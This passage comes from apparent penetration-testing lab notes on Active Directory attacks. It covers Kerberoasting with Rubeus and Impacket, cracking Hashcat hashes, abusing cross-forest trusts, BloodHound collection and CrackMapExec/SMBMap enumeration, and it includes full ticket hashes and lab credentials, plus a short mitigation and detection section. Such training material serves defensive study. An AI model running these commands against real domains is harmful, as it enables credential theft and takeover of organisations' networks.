|_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n\n[*] Action: Kerberoasting\n\n[*] Listing statistics about target users, no ticket requests being performed.\n[*] Target Domain          : legalcorp.local\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.legalcorp.local/DC=LEGALCORP,DC=LOCAL' for '(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'\n\n[*] Total kerberoastable users : 9\n\n\n ------------------------------------------------------------\n | Supported Encryption Type                        | Count |\n ------------------------------------------------------------\n | RC4_HMAC_DEFAULT                                 | 7     |\n | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |\n ------------------------------------------------------------\n\n ----------------------------------\n | Password Last Set Year | Count |\n ----------------------------------\n | 2022                   | 9     |\n ----------------------------------\n</code></pre> <p>Let's use Rubeus to request tickets for accounts with the <code>admincount</code> attribute set to <code>1</code>. These would likely be high-value targets and worth our initial focus. Specify the <code>/nowrap</code> flag so that the hash can be more easily copied down for offline cracking using Hashcat.</p> <p><pre><code>PS C:\\xyz&gt; .\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n\n[*] Action: Kerberoasting\n\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts.\n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\n\n[*] Target Domain          : legalcorp.local\n[*] Searching path 'LDAP://ACADEMY-EA-DC01.legalcorp.local/DC=LEGALCORP,DC=LOCAL' for '(&amp;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'\n\n[*] Total kerberoastable users : 3\n\n\n[*] SamAccountName         : backupagent\n[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=LEGALCORP,DC=LOCAL\n[*] ServicePrincipalName   : backupjob/veam001.legalcorp.local\n[*] PwdLastSet             : 2/15/2022 2:15:40 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*backupagent$legalcorp.local$backupjob/veam001.legalcorp.local@legalcorp.local*$750F377DEFA85A67EA0FE51B0B28F83D$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B49E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E\n</code></pre> <pre><code>secops@kali[/kali]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt \n\nhashcat (v6.1.1) starting...\n\n&lt;SNIP&gt;64bea80dc3608b6c8c14f244cbaa083443eb59d9ef3599fca72c6997c824b87cf7f7ef6621b3eaa5aa0119177fc480a20b82203081609e42748920274febb94c3826d57c78ad93f04400dc9626cf978225c51a889224e3ed9e3bfdf6a4d6998c16d414947f9e157cb1594b268be470d6fb489c2c6c56d2ad564959c5:welcome1$\n\n&lt;SNIP&gt;\n</code></pre></p>  Encryption Types <p>Kerberoasting tools typically request <code>RC4 encryption</code> when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with <code>$krb5tgs$23$*</code>, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with <code>$krb5tgs$18$*</code>. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.</p>  <p>We can use Rubeus with the <code>/tgtdeleg</code> flag to specify that we want only RC4 encryption when requesting a new service ticket.</p>  <p>Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use. </p>  <p>It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: <code>Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options</code>, then double-clicking on <code>Network security: Configure encryption types allowed for Kerberos</code> and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for <code>RC4_HMAC_MD5</code> would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.</p>  Mitigation and Detection <p>An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use Managed Service Accounts (MSA), and Group Managed Service Accounts (gMSA), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.</p> <p>Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of <code>TGS-REQ</code> and <code>TGS-REP</code> requests and responses, signaling the use of automated Kerberoasting tools. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting Audit Kerberos Service Ticket Operations within Group Policy.</p> <p>Doing so will generate two separate event IDs: 4769: A Kerberos service ticket was requested, and 4770: A Kerberos service ticket was renewed. 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.</p> <p>Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).</p> <p>This Post by Sean Metcalf highlights some mitigation and detection strategies for Kerberoasting.</p>","title":"Kerberoasting - Windows"},{"location":"active_directory/cross_forest_trust/cross_forest_trust_abuse_from_linux/","text":"<p>It is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with <code>GetUserSPNs.py</code> from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the <code>-target-domain</code> flag in our command.</p> Cross-Forest Kerberoasting <pre><code>secops@kali[/kali]$ GetUserSPNs.py -target-domain LEGALLOGISTICS.LOCAL LEGALCORP/wley\n\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation \n-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------\nMSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=LEGALLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  &lt;never&gt; \n</code></pre> <p>Rerunning the command with the <code>-request</code> flag added gives us the TGS ticket. We could also add <code>-outputfile &lt;OUTPUT FILE&gt;</code> to output directly into a file that we could then turn around and run Hashcat against.</p> <pre><code>secops@kali[/kali]$ GetUserSPNs.py -request -target-domain LEGALLOGISTICS.LOCAL legalcorp.local/wley  \n\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation \n-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------\nMSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=LEGALLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  &lt;never&gt;               \n\n\n$krb5tgs$23$*mssqlsvc$LEGALLOGISTICS.LOCAL$LEGALLOGISTICS.LOCAL/mssqlsvc*$10&lt;SNIP&gt;\n</code></pre> <p>We could then attempt to crack this offline using Hashcat with mode <code>13100</code>. If successful, we'd be able to authenticate into the <code>LEGALLOGISTICS.LOCAL</code> domain as a Domain Admin. If we are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use.</p>  <p>Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains.</p>   Hunting Foreign Group Membership with Bloodhound-python <p>If we are testing from a Linux host, we can gather this information by using the Python implementation of BloodHound.</p> <p>This tool requires a DNS hostname for the target Domain Controller instead of an IP address.</p> <pre><code>secops@kali[/kali]$ cat /etc/resolv.conf \n\n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n# 127.0.0.53 is the systemd-resolved stub resolver.\n# run \"resolvectl status\" to see details about the actual nameservers.\n\n#nameserver 1.1.1.1\n#nameserver 8.8.8.8\ndomain legalcorp.local\nnameserver 172.16.5.5\n</code></pre> <pre><code>secops@kali[/kali]$ bloodhound-python -d legalcorp.local -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2\n\nINFO: Found AD domain: legalcorp.local\nINFO: Connecting to LDAP server: ACADEMY-EA-DC01\nINFO: Found 1 domains\nINFO: Found 2 domains in the forest\nINFO: Found 559 computers\nINFO: Connecting to LDAP server: ACADEMY-EA-DC01\nINFO: Found 2950 users\nINFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.legalcorp.local\nINFO: Found 183 groups\nINFO: Found 2 trusts\n\n&lt;SNIP&gt;\n</code></pre> <pre><code>secops@kali[/kali]$ zip -r lcorp_bh.zip *.json\n\n  adding: 20220329140127_computers.json (deflated 99%)\n  adding: 20220329140127_domains.json (deflated 82%)\n  adding: 20220329140127_groups.json (deflated 97%)\n  adding: 20220329140127_users.json (deflated 98%)\n</code></pre> <p>Upload one single zip file directly into the BloodHound GUI.</p> <p>Repeat the same process, this time filling in the details for the <code>LEGALLOGISTICS.LOCAL</code> domain. <pre><code>secops@kali[/kali]$ cat /etc/resolv.conf \n\n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n# 127.0.0.53 is the systemd-resolved stub resolver.\n# run \"resolvectl status\" to see details about the actual nameservers.\n\n#nameserver 1.1.1.1\n#nameserver 8.8.8.8\ndomain LEGALLOGISTICS.LOCAL\nnameserver 172.16.5.238\n</code></pre></p> <pre><code>secops@kali[/kali]$ bloodhound-python -d LEGALLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.LEGALLOGISTICS.LOCAL -c All -u forend@legalcorp.local -p Klmcargo2\n\nINFO: Found AD domain: LEGALLOGISTICS.local\nINFO: Connecting to LDAP server: ACADEMY-EA-DC03.LEGALLOGISTICS.LOCAL\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 5 computers\nINFO: Connecting to LDAP server: ACADEMY-EA-DC03.LEGALLOGISTICS.LOCAL\nINFO: Found 9 users\nINFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.LEGALLOGISTICS.LOCAL\nINFO: Found 52 groups\nINFO: Found 1 trusts\nINFO: Starting computer enumeration with 10 workers\n</code></pre> <p>After uploading the second set of data (either each JSON file or as one zip file), we can click on <code>Users with Foreign Domain Group Membership</code> under the <code>Analysis</code> tab and select the source domain as <code>legalcorp.local</code>. Here, we will see the built-in Administrator account for the legalcorp.local domain is a member of the built-in Administrators group in the LEGALLOGISTICS.LOCAL domain.</p>","title":"Cross-Forest Trust Abuse - from Linux"},{"location":"active_directory/cross_forest_trust/cross_forest_trust_abuse_from_win/","text":"Cross-Forest Kerberoasting <p>Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.</p> <pre><code>PS C:\\xyz&gt; Get-DomainUser -SPN -Domain LEGALLOGISTICS.LOCAL | select SamAccountName\n\nsamaccountname\n--------------\nkrbtgt\nmssqlsvc\n</code></pre> <p>A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.</p> <pre><code>PS C:\\xyz&gt; Get-DomainUser -Domain LEGALLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof\n\nsamaccountname memberof\n-------------- --------\nmssqlsvc       CN=Domain Admins,CN=Users,DC=LEGALLOGISTICS,DC=LOCAL\n</code></pre> Performing a Kerberoasting Attacking with Rubeus Using /domain Flag <pre><code>PS C:\\xyz&gt; .\\Rubeus.exe kerberoast /domain:LEGALLOGISTICS.LOCAL /user:mssqlsvc /nowrap\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2\n\n[*] Action: Kerberoasting\n\n[*] NOTICE: AES hashes will be returned for AES-enabled accounts.\n[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\n\n[*] Target User            : mssqlsvc\n[*] Target Domain          : LEGALLOGISTICS.LOCAL\n[*] Searching path 'LDAP://ACADEMY-EA-DC03.LEGALLOGISTICS.LOCAL/DC=LEGALLOGISTICS,DC=LOCAL' for '(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'\n\n[*] Total kerberoastable users : 1\n\n[*] SamAccountName         : mssqlsvc\n[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=LEGALLOGISTICS,DC=LOCAL\n[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433\n[*] PwdLastSet             : 3/24/2022 12:47:52 PM\n[*] Supported ETypes       : RC4_HMAC_DEFAULT\n[*] Hash                   : $krb5tgs$23$*mssqlsvc$LEGALLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@LEGALLOGISTICS.LOCAL*$&lt;SNIP&gt;\n</code></pre> <p>We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.</p>  Admin Password Re-Use &amp; Group Membership <p>We can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as <code>foreign group membership</code>. Let's try this against the <code>LEGALLOGISTICS.LOCAL</code> domain with which we have an external bidirectional forest trust.</p> <pre><code>PS C:\\xyz&gt; Get-DomainForeignGroupMember -Domain LEGALLOGISTICS.LOCAL\n\nGroupDomain             : LEGALLOGISTICS.LOCAL\nGroupName               : Administrators\nGroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=LEGALLOGISTICS,DC=LOCAL\nMemberDomain            : LEGALLOGISTICS.LOCAL\nMemberName              : S-1-5-21-3842939050-3880317879-2865463114-500\nMemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS\n                          TICS,DC=LOCAL\n\nPS C:\\xyz&gt; Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500\n\nLEGALCORP\\administrator\n</code></pre> <p>The above command output shows that the built-in Administrators group in <code>LEGALLOGISTICS.LOCAL</code> has the built-in Administrator account for the <code>legalcorp.local</code> domain as a member. We can verify this access using the <code>Enter-PSSession</code> cmdlet to connect over WinRM.</p> <pre><code>PS C:\\xyz&gt; Enter-PSSession -ComputerName ACADEMY-EA-DC03.LEGALLOGISTICS.LOCAL -Credential LEGALCORP\\administrator\n\n[ACADEMY-EA-DC03.LEGALLOGISTICS.LOCAL]: PS C:\\Users\\administrator.LEGALCORP\\Documents&gt; whoami\nLEGALCORP\\administrator\n\n[ACADEMY-EA-DC03.LEGALLOGISTICS.LOCAL]: PS C:\\Users\\administrator.LEGALCORP\\Documents&gt; ipconfig /all\n\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03\n   Primary Dns Suffix  . . . . . . . : LEGALLOGISTICS.LOCAL\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n   DNS Suffix Search List. . . . . . : LEGALLOGISTICS.LOCAL\n</code></pre> <p>From the command output above, we can see that we successfully authenticated to the Domain Controller in the <code>LEGALLOGISTICS.LOCAL</code> domain using the Administrator account from the <code>legalcorp.local</code> domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.</p>","title":"Cross-Forest Trust Abuse - from Windows"},{"location":"active_directory/deeper_down_the_rabbithole/credentialed_enumeration_from_linux/","text":"<p>Now that we have acquired a foothold in the domain, it is time to dig deeper using our low privilege domain user credentials. At a minimum, we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.</p>  CrackMapExec <p>See wiki.</p> <pre><code>secops@kali[/kali]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\forend:Klmcargo2 \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\user                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  legalcorp.local\\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395\n\n&lt;SNIP&gt;\n</code></pre> CME - Domain Group Enumeration <pre><code>secops@kali[/kali]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\forend:Klmcargo2 \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0\n\n&lt;SNIP&gt;\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0\n\n&lt;SNIP&gt;\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36\n\n&lt;SNIP&gt;\n</code></pre> <p>Take note of key groups like <code>Administrators</code>, <code>Domain Admins</code>, <code>Executives</code>, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting.</p> CME - Logged On Users <pre><code>secops@kali[/kali]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users\n\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:legalcorp.local) (signing:False) (SMBv1:False)\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] legalcorp.local\\forend:Klmcargo2 (Pwn3d!)\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  LEGALCORP\\clusteragent              logon_server: ACADEMY-EA-DC01\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  LEGALCORP\\lab_adm                   logon_server: ACADEMY-EA-DC01\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  LEGALCORP\\svc_qualys                logon_server: ACADEMY-EA-DC01\nSMB         172.16.5.130    445    ACADEMY-EA-FILE  LEGALCORP\\wley                      logon_server: ACADEMY-EA-DC01\n\n&lt;SNIP&gt;\n</code></pre> CME Share Searching <pre><code>secops@kali[/kali]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\forend:Klmcargo2 \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ            \nSMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ \n</code></pre> <p>The module <code>spider_plus</code> will dig through each readable share on the host and list all readable files. </p> <pre><code>secops@kali[/kali]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\forend:Klmcargo2 \nSPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:\nSPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: ['print$']\nSPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: ['ico', 'lnk']\nSPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200\nSPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus\n</code></pre> <p>When completed, CME writes the results to a JSON file located at <code>/tmp/cme_spider_plus/&lt;ip of host&gt;</code>. Below we can see a portion of the JSON output. We could dig around for interesting files such as <code>web.config</code> files or scripts that may contain passwords. If we wanted to dig further, we could pull those files to see what all resides within, perhaps finding some hardcoded credentials or other sensitive information.</p> <pre><code>secops@kali[/kali]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json \n\n{\n    \"Department Shares\": {\n        \"Accounting/Private/AddSelect.bat\": {\n            \"atime_epoch\": \"2022-03-31 14:44:42\",\n            \"ctime_epoch\": \"2022-03-31 14:44:39\",\n            \"mtime_epoch\": \"2022-03-31 15:14:46\",\n            \"size\": \"278 Bytes\"\n        },\n        \"Accounting/Private/ApproveConnect.wmf\": {\n            \"atime_epoch\": \"2022-03-31 14:45:14\",\n\n&lt;SNIP&gt;\n</code></pre>  SMBMap <pre><code>secops@kali[/kali]$ smbmap -u forend -p Klmcargo2 -d legalcorp.local -H 172.16.5.5\n\n[+] IP: 172.16.5.5:445  Name: legalcorp.local                               \n        Disk                                                    Permissions Comment\n    ----                                                    ----------- -------\n    ADMIN$                                              NO ACCESS   Remote Admin\n    C$                                                  NO ACCESS   Default share\n    Department Shares                                   READ ONLY   \n    IPC$                                                READ ONLY   Remote IPC\n    NETLOGON                                            READ ONLY   Logon server share \n    SYSVOL                                              READ ONLY   Logon server share \n    User Shares                                         READ ONLY   \n    ZZZ_archive                                         READ ONLY\n</code></pre> <p>Recursive List Of All Directories <pre><code>secops@kali[/kali]$ smbmap -u forend -p Klmcargo2 -d legalcorp.local -H 172.16.5.5 -R 'Department Shares' --dir-only\n\n[+] IP: 172.16.5.5:445  Name: legalcorp.local                               \n        Disk                                                    Permissions Comment\n    ----                                                    ----------- -------\n    Department Shares                                   READ ONLY   \n    .\\Department Shares\\*\n    dr--r--r--                0 Thu Mar 31 15:34:29 2022    .\n    dr--r--r--                0 Thu Mar 31 15:34:29 2022    ..\n    dr--r--r--                0 Thu Mar 31 15:14:48 2022    Accounting\n    dr--r--r--                0 Thu Mar 31 15:14:39 2022    Executives\n    dr--r--r--                0 Thu Mar 31 15:14:57 2022    Finance\n    dr--r--r--                0 Thu Mar 31 15:15:04 2022    HR\n    dr--r--r--                0 